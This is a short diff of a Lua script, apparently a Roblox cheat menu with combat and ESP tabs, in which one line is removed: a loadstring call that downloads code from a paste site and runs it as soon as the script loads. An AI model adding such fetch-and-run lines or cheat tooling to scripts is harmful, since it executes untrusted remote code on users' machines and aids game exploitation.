@@ -467,7 +467,6 @@ Tabs.Combat:Toggle({
         end)
     end end
 })
-loadstring(game:HttpGet("https://paste.debian.net/plainh/59cec5e6/", true))()
 -- Visuals Tab
 Tabs.Visuals:Section({ Title = "Visuals / ESP" })
 local espToggle = Tabs.Visuals:Toggle({
